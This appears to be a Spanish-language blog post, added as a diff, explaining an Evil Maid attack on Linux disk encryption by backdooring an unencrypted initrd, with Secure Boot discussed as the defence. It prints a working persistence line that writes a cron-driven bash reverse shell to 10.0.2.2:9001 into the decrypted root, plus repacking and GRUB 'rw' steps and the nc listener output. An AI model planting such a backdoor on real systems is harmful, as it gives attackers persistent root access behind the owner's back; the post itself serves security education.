@@ -1,0 +1,186 @@
+<html>
+<head>
+  <title>así atacan el cifrado de disco en linux</title>
+  <link rel="stylesheet" href="/styles.css">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png">
+</head>
+<body>
+  <header>
+    <a href='/es'>[sobre mí]</a>
+  </header>
+
+  <article>
+  <p>ASÍ ATACAN EL CIFRADO DE DISCO EN LINUX</p>
+  <hr>
+
+  <img src="img/header.webp" style="max-width:100%">
+
+  <p>Hoy en día llevamos prácticamente toda nuestra vida con nosotros: móviles, portátiles, cuentas y comunicaciones. Gran parte de nuestra información está almacenada en estos dispositivos y, aunque la mayoría incluyen full disk encryption, la policía puede desbloquear muchos de ellos.</p>
+
+  <p>En este artículo vamos a explorar un <b>Evil Maid Attack</b> contra el cifrado de disco en Linux. Básicamente, se trata de un ataque en el que un atacante necesita acceso físico a tu equipo para poder modificarlo sin que lo notes, alterando el proceso de arranque para ejecutar código malicioso. Es el clásico escenario: dejas tu portátil en un hotel y, mientras no estás, alguien lo manipula sin que te des cuenta.</p>
+
+  <p>Hay que tener en cuenta que el problema no es el cifrado de Linux, sino la incorrecta implementación del arranque.</p>
+
+  <p><b>¿Cómo funciona el arranque en Linux?</b></p>
+
+  <p>Antes de entrar en cómo se lleva a cabo este ataque, vamos a ver cómo funciona el arranque en Linux. En términos generales, podemos resumirlo de la siguiente manera:</p>
+
+  <p>[Encendido] → [UEFI] → [Bootloader] → [Kernel+Initrd] → [Init system] → [Login]</p>
+
+  <p>Al encender el equipo, el firmware UEFI se ejecuta y toma el control realizando una serie de comprobaciones para asegurarse de que el hardware está bien. Una vez finalizadas, consulta las entradas de arranque almacenadas en la NVRAM. Cada una de estas entradas contiene la <b>ruta completa a un binario EFI</b> (normalmente un bootloader) ubicado en la partición EFI. Dado que UEFI es capaz de leer sistemas de archivos FAT, puede localizar estos binarios, cargarlos en memoria y transferirles la ejecución.</p>
+
+  <p>Ejecutando el comando <code>sudo efibootmgr</code> podemos ver qué aplicación EFI se va a ejecutar al iniciar el sistema:</p>
+
+<pre>
+BootCurrent: 0008
+Boot0008* debian HD(1,GPT,75a8d3c7-0bb8-47ff-8f65-68a0d25b71ab,0x800,0x3c800)/File(\EFI\debian\shimx64.efi)
+</pre>
+
+  <p>En este caso, UEFI arrancará el archivo <code>shimx64.efi</code> de Debian, un bootloader intermedio firmado por Microsoft que permite iniciar Linux con Secure Boot habilitado. Este bootloader transfiere la ejecución al <b>bootloader real</b>, que normalmente es GRUB (<code>grubx64.efi</code>).</p>
+
+  <p>Una vez que se ejecuta GRUB, este accede a la partición boot y lee su archivo de configuración <code>grub.cfg</code>. Si existen varias opciones de kernel o sistemas operativos, muestra un menú de arranque y aplica los parámetros de kernel definidos en la configuración. Para terminar, GRUB carga tanto el kernel de Linux como el initrd en memoria y deriva la ejecución del arranque al kernel.</p>
+
+<pre>
+/boot/initrd.img-6.12.74+deb13+1-amd64
+/boot/vmlinuz-6.12.74+deb13+1-amd64
+</pre>
+
+  <p>En este punto, el kernel aún está comprimido, por lo que lo primero que hace al ejecutarse es <b>descomprimirse e inicializarse</b>, configurando el entorno básico de hardware: CPU, memoria RAM, buses y dispositivos esenciales. Para continuar, el kernel debe montar la <b>partición raíz</b>, pero este no tiene soporte integrado para todas las configuraciones posibles de almacenamiento como, RAID, LVM, discos cifrados, distintos sistemas de archivos, etc.</p>
+
+  <p>Por ello, el kernel monta el <b>initrd</b>, un sistema de archivos comprimido cargado en RAM, que contiene todos los módulos y utilidades necesarios para el hardware específico del sistema. En esta fase, se ejecutan scripts que permiten, por ejemplo, <b>desencriptar discos</b>, <b>montar volúmenes RAID o LVM</b> y preparar todo lo necesario para finalmente montar el <b>sistema de archivos raíz (/)</b> y continuar con el arranque del sistema operativo.</p>
+
+  <p>Una vez montada la partición raíz, se ejecuta el proceso init o systemd. Este proceso inicializa todos los servicios del sistema, como el montaje de otras particiones, la configuración de red, el inicio de demonios y servicios esenciales, y el arranque de la interfaz gráfica si aplica.</p>
+
+  <p><b>Backdoor a partición de arranque sin cifrar</b></p>
+
+  <p>Al habilitar la opción de cifrado de disco en la mayoría de los instaladores de Linux, estos suelen crear el mismo esquema de particiones: una partición EFI para los bootloaders, una partición de arranque que contiene el kernel, el <code>initrd</code> y la configuración de GRUB, y la partición raíz cifrada.</p>
+
+<pre>
+vda            254:0    0    5G  0 disk
+├─vda1         254:1    0  121M  0 part  /boot/efi
+├─vda2         254:2    0  488M  0 part  /boot
+└─vda3         254:3    0  4,4G  0 part
+  └─vda3_crypt 253:0    0  4,4G  0 crypt /
+</pre>
+
+  <p>Como hemos visto, el kernel para descifrar las particiones necesita unos scripts y módulos que se encuentran en el initrd. La idea es modificar estos scripts para añadir código que nos permita crear un backdoor en el sistema una vez esté descifrado.</p>
+
+  <p>Como no tenemos acceso al sistema, arrancamos mediante un live cd y montamos la partición boot en el entorno en vivo. Para realizar el ataque vamos a obtener el archivo initrd y vamos a descomprimirlo con la utilidad unmkinitramfs.</p>
+
+<pre>
+alzze@ubuntu:$ ./unmkinitramfs -v initrd.img-6.12.74+deb13+1-amd64 extracted-initrd
+.
+kernel
+kernel/x86
+kernel/x86/microcode
+kernel/x86/microcode/AuthenticAMD.bin
+</pre>
+
+  <p>Una vez descomprimido, vemos que contiene un script <code>main/init</code>. Este script es <b>el primer proceso que se ejecuta en espacio de usuario</b> dentro del initramfs y se encarga de cargar módulos, detectar dispositivos y configurar el entorno básico, dejando listo el sistema para montar finalmente la <b>partición raíz</b>.</p>
+
+  <p>En este punto ya se tiene acceso a una de las fases más críticas del arranque de Linux, donde se realiza el descifrado del disco y se prepara la partición raíz. Cualquier modificación en este entorno puede afectar directamente a la seguridad del sistema. Por ejemplo, se podría alterar el binario <code>/sbin/cryptroot</code> o los distintos scripts que lo ejecutan para añadir un backdoor en la utilidad encargada de descifrar las particiones.</p>
+
+<pre>
+alzze@ubuntu:main $ grep -RnI "/sbin/cryptsetup" . | wc -l
+11
+</pre>
+
+  <p>En este caso vamos a modificar el script <code>init</code>, añadiendo un backdoor sencillo que nos permita establecer una reverse shell una vez el sistema haya arrancado por completo. Esto abriría la puerta a la ejecución de todo tipo de <b>malware</b> en el sistema, como cryptominers, keyloggers, ransomware...</p>
+
+<pre>
+#Backdoor
+CRON="${rootmnt}/etc/crontab"
+LINE='* * * * *  root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.2/9001 0>&1"'
+grep -Fq "$LINE" "$CRON" || echo "$LINE" >> "$CRON"
+
+# Chain to real filesystem
+exec run-init ${drop_caps} "${rootmnt}" "${init}" "$@" &lt;"${rootmnt}/dev/console" &gt;"${rootmnt}/dev/console" 2>&1
+echo "Something went badly wrong in the initramfs."
+panic "Please file a bug on initramfs-tools."
+</pre>
+
+  <p>Volvemos a comprimir el archivo y lo cambiamos con el initrd original.</p>
+
+<pre>
+#!/bin/bash
+cd extracted/early
+find . -print0 | cpio --null -o -H newc > ../../early.cpio
+cd ../early2
+find . -print0 | cpio --null -o -H newc > ../../early2.cpio
+cd ../main
+find . -print0 | cpio --null -o -H newc > ../../main.cpio
+cd ../..
+zstd -T0 -19 main.cpio -o compressed-main.cpio
+
+cat early.cpio early2.cpio compressed-main.cpio > initrd.img-6.12.74+deb13+1-amd64-modified
+</pre>
+
+  <p>Debian pasa por defecto al kernel el parámetro <code>ro</code>, lo que hace que el sistema de archivos raíz se monte en modo solo lectura durante el arranque. Como necesitamos modificar archivos del sistema para introducir el <b>backdoor</b>, es necesario ajustar la configuración de GRUB y cambiar este parámetro a <code>rw</code>, permitiendo así el montaje con permisos de escritura desde las primeras fases del arranque.</p>
+
+<pre>
+linux   /vmlinuz-6.12.74+deb13+1-amd64 root=UUID=c52d35dc-fe65-4d68-ae0c-812f866b19d3 rw  quiet
+</pre>
+
+  <p>A partir de ahora cuando el sistema arranque tendremos acceso permanente al sistema con usuario root.</p>
+
+<pre>
+alzze@ubuntu:~ $ nc -nlvp 9001
+Listening on 0.0.0.0 9001
+Connection received on 127.0.0.1 53662
+root@deb:~#
+</pre>
+
+  <p><b>Evil Maid Attack a FDE</b></p>
+
+  <p>La mayoría de instaladores de Linux no implementan <b>Full Disk Encryption (FDE)</b> completo. Aunque <b>GRUB</b> sí lo soporta, en estos casos la partición de arranque está cifrada, pero el ataque no desaparece: simplemente cambia de lugar.</p>
+
+  <p>Ya no es posible modificar el <code>initrd</code> o los scripts de arranque como antes, porque todo ese contenido está cifrado. En este escenario, el objetivo pasa a ser el <b>bootloader</b>.</p>
+
+  <p>GRUB, en configuraciones con FDE, se encarga de pedir la passphrase, descifrar el volumen y cargar el kernel. Si un atacante modifica su binario EFI en la partición EFI, puede introducir código que se ejecute antes del descifrado. Sigue siendo un EMA, pero atacando el bootloader.</p>
+
+  <p>
+    El problema sigue siendo el mismo: <b>no se verifica la integridad de lo que se ejecuta en el arranque</b>.
+  </p>
+
+  <p>
+    Aquí entra <b>Secure Boot</b>. UEFI solo ejecuta binarios firmados y de confianza. Si GRUB ha sido modificado, la firma deja de ser válida y el sistema bloquea el arranque. Esto introduce una cadena de confianza que impide este tipo de ataques. Aun así, depende de la configuración. Si Secure Boot puede desactivarse o se añaden claves maliciosas, la protección deja de ser efectiva.
+  </p>
+
+  <p>
+    Para no alargar más el post, no vamos a entrar en la implementación de Secure Boot. Quizá en el futuro nos metamos en la madriguera del TPM y todo lo que hay detrás.
+  </p>
+  </article>
+</body>
+<style>
+  * {
+    font-family: monospace;
+  }
+
+  header {
+    display: flex;
+    justify-content: flex-end;
+  }
+
+  body{
+    display: flex;
+    flex-direction: column;
+    width: 95%;
+    max-width:750px;
+    margin:auto;
+  }
+
+  article{
+    max-width: 100%;
+    margin:auto;
+  }
+
+  pre {
+    max-width: 100%;
+    overflow-x: auto;
+    padding-top: 1rem;
+    padding-bottom: 1rem;
+  }
+</style>
+</html>
